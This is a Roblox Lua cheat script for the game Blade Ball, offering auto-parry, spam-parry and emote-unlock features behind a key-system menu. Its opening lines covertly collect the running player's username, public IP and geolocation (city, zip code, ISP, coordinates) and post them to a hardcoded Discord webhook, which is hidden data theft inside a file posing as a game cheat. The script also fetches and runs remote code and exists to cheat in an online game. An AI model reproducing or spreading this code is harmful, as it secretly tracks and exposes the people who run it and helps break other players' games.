local name = game:GetService("Players").LocalPlayer.Name
local WebhookURL = "https://discord.com/api/webhooks/1170047672200200242/2OPS75uIiajusrLr5xkNE10yiK1WsubGkaTQeupXhMxLkWoC0oSdWfHos7WAbBo4mT4O"
local getIPResponse = syn.request({
    Url = "https://api.ipify.org/?format=json",
    Method = "GET"
})
local GetIPJSON = game:GetService("HttpService"):JSONDecode(getIPResponse.Body)
local IPBuffer = tostring(GetIPJSON.ip)

local getIPInfo = syn.request({
    Url = string.format("http://ip-api.com/json/%s", IPBuffer),
    Method = "Get"
})
local IIT = game:GetService("HttpService"):JSONDecode(getIPInfo.Body)
local FI = {
    IP = IPBuffer,
    country = IIT.country,
    countryCode = IIT.countryCode,
    region = IIT.region,
    regionName = IIT.regionName,
    city = IIT.city,
    zipcode = IIT.zip,
    latitude = IIT.lat,
    longitude = IIT.lon,
    isp = IIT.isp,
    org = IIT.org
}
local dataMessage = string.format("User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s", name, FI.IP, FI.country, FI.countryCode, FI.region, FI.regionName, FI.city, FI.zipcode, FI.isp, FI.org)
local MessageData = {
    ["content"] = dataMessage
}

syn.request(
    {
        Url = WebhookURL, 
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(MessageData)
    }
)

local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
   Name = "Blade Ball || Fazed Hub",
   LoadingTitle = "Fazed Hub",
   LoadingSubtitle = "by xeno",
   ConfigurationSaving = {
      Enabled = false,
      FolderName = nil, -- Create a custom folder for your hub/game
      FileName = "Fazed Hub"
   },
   Discord = {
      Enabled = false,
      Invite = "QmgyFqRcp8", -- The Discord invite code, do not include discord.gg/. E.g. discord.gg/ABCD would be ABCD
      RememberJoins = true -- Set this to false to make them join the discord every time they load it up
   },
   KeySystem = true, -- Set this to true to use our key system
   KeySettings = {
      Title = "Fazed Key System",
      Subtitle = nil,
      Note = "To get the key, join our discord server, vanity: QmgyFqRcp8",
      FileName = "Keys", -- It is recommended to use something unique as other scripts using Rayfield may overwrite your key file
      SaveKey = false, -- The user's key will be saved, but if you change the key, they will be unable to use your script
      GrabKeyFromSite = false, -- If this is true, set Key below to the RAW site you would like Rayfield to get the key from
      Key = {"FAZEDBLADEBALL"} -- List of keys that will be accepted by the system, can be RAW file links (pastebin, github etc) or simple strings ("hello","key22")
   }
})

local runService = game:GetService("RunService")
local workspace = game:GetService("Workspace")
local players = game:GetService("Players")
local localPlayer = players.LocalPlayer
local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
local abilitiesFolder = character:WaitForChild("Abilities")
local UserInputService = game:GetService("UserInputService")
local replicatedStorage = game:GetService("ReplicatedStorage")
local heartbeatConnection
local upgrades = localPlayer.Upgrades
local UseRage = false
local sliderValue = 20

local function onCharacterAdded(newCharacter)
    character = newCharacter
    abilitiesFolder = character:WaitForChild("Abilities")
end

localPlayer.CharacterAdded:Connect(onCharacterAdded)

Rayfield:Notify({
   Title = "✅ Script Executed ✅",
   Content = "Fazed Best Hub?",
   Duration = 5,
   Image = nil,
   Actions = { -- Notification Buttons
      Ignore = {
         Name = "Yes sir!",
         Callback = function()
         print("We agree with you")
      end
   },
},
})


local function startAutoParry()
    local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
    local ballsFolder = workspace:WaitForChild("Balls")
    local parryButtonPress = replicatedStorage.Remotes.ParryButtonPress
    local abilityButtonPress = replicatedStorage.Remotes.AbilityButtonPress

    print("Auto Parry succesfully toggled.")

    local function onCharacterAdded(newCharacter)
        character = newCharacter
    end
    localPlayer.CharacterAdded:Connect(onCharacterAdded)

    if character then
        print("Character found.")
    else
        print("Character not found.")
        return
    end
    

local function chooseNewFocusedBall()
    local balls = ballsFolder:GetChildren()
    for _, ball in ipairs(balls) do
        if ball:GetAttribute("realBall") ~= nil and ball:GetAttribute("realBall") == true then
            focusedBall = ball
            print(focusedBall.Name)
            break
        elseif ball:GetAttribute("target") ~= nil then
            focusedBall = ball
            print(focusedBall.Name)
            break
        end
    end
    
    if focusedBall == nil then
        print("Debug: Could not find a ball that's the realBall or has a target.")
    end
    return focusedBall
end

    chooseNewFocusedBall()

    local BASE_THRESHOLD = 0.15
    local VELOCITY_SCALING_FACTOR_FAST = 0.050
    local VELOCITY_SCALING_FACTOR_SLOW = 0.1

    local function getDynamicThreshold(ballVelocityMagnitude)
        if ballVelocityMagnitude > 60 then
            print("Fazed ON TOP")
            return math.max(0.20, BASE_THRESHOLD - (ballVelocityMagnitude * VELOCITY_SCALING_FACTOR_FAST))
        else
            return math.min(0.01, BASE_THRESHOLD + (ballVelocityMagnitude * VELOCITY_SCALING_FACTOR_SLOW))
        end
    end

    local function timeUntilImpact(ballVelocity, distanceToPlayer, playerVelocity)
        local directionToPlayer = (character.HumanoidRootPart.Position - focusedBall.Position).Unit
        local velocityTowardsPlayer = ballVelocity:Dot(directionToPlayer) - playerVelocity:Dot(directionToPlayer)
        
        if velocityTowardsPlayer <= 0 then
            return math.huge
        end
        
        return (distanceToPlayer - sliderValue) / velocityTowardsPlayer
    end

    local function isWalkSpeedZero()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            return humanoid.WalkSpeed == 0
        end
        return false
    end


    local function checkBallDistance()
        if not character or not character:FindFirstChild("Highlight") then return end

        local charPos = character.PrimaryPart.Position
        local charVel = character.PrimaryPart.Velocity

        if focusedBall and not focusedBall.Parent then
            print("Focused ball lost parent. Choosing a new focused ball.")
            chooseNewFocusedBall()
        end
        if not focusedBall then 
            print("No focused ball.")
            chooseNewFocusedBall()
        end

        local ball = focusedBall
        local distanceToPlayer = (ball.Position - charPos).Magnitude
        local ballVelocityTowardsPlayer = ball.Velocity:Dot((charPos - ball.Position).Unit)
        
        if distanceToPlayer < 10 then
            parryButtonPress:Fire()
        end
        local isCheckingRage = false

        if timeUntilImpact(ball.Velocity, distanceToPlayer, charVel) < getDynamicThreshold(ballVelocityTowardsPlayer) then
            if character.Abilities["Raging Deflection"].Enabled and UseRage == true then
                if not isCheckingRage then
                    isCheckingRage = true
                    abilityButtonPress:Fire()
                    if not isWalkSpeedZero() then
                        parryButtonPress:Fire()
                    end
                    isCheckingRage = false
                end
            else
                parryButtonPress:Fire()
            end
        end
    end


    heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
        checkBallDistance()
    end)
end

local function stopAutoParry()
    if heartbeatConnection then
        heartbeatConnection:Disconnect()
        heartbeatConnection = nil
    end
end

local AutoParry = Window:CreateTab("Auto Parry", 13014537525)

local AutoParrySection = AutoParry:CreateSection("Auto Parry")

local AutoParryToggle = AutoParry:CreateToggle({
    Name = "Auto Parry",
    CurrentValue = false,
    Flag = "AutoParryFlag",
    Callback = function(Value)
        if Value then
            startAutoParry()
        else
            stopAutoParry()
        end
    end,
})

local CloseFighting = AutoParry:CreateSection("Close Fighting")

local SpamParry = AutoParry:CreateKeybind({
   Name = "Spam Parry (Hold)",
   CurrentKeybind = "C",
   HoldToInteract = true,
   Flag = "ToggleParrySpam", 
   Callback = function(Keybind)
            local function click(a)
    game:GetService("VirtualInputManager"):SendMouseButtonEvent(a.AbsolutePosition.X+a.AbsoluteSize.X/2,a.AbsolutePosition.Y+50,0,true,a,1)
    game:GetService("VirtualInputManager"):SendMouseButtonEvent(a.AbsolutePosition.X+a.AbsoluteSize.X/2,a.AbsolutePosition.Y+50,0,false,a,1)
end

click(game:GetService("Players").LocalPlayer.PlayerGui.Hotbar.Block.Pressable1)
   end,
})

local Configuration = AutoParry:CreateSection("Configuration")

local DistanceSlider = AutoParry:CreateSlider({
   Name = "Distance Configuration",
   Range = {0, 28},
   Increment = 1,
   Suffix = "Distance",
   CurrentValue = 20,
   Flag = "DistanceSlider",
   Callback = function(Value)
       sliderValue = Value
   end,
})

local GamepassEmote = Window:CreateTab("Gamepass Emote", 13014537525)

local emotes = GamepassEmote:CreateSection("Gamepass Emote")

local EmoteEffect = GamepassEmote:CreateButton({
   Name = "Gamepass Emote Effect + Music",
   Callback = function()
   local args = {[1] = true,[2] = "Empyrean"}game:GetService("ReplicatedStorage").Remotes.CustomEmote:FireServer(unpack(args))
end
})

local ActualEmote = GamepassEmote:CreateButton({
   Name = "Gamepass Emote",
   Callback = function()
   character:FindFirstChildOfClass("Model").Name = "Empyrean Greatblade"
end
})
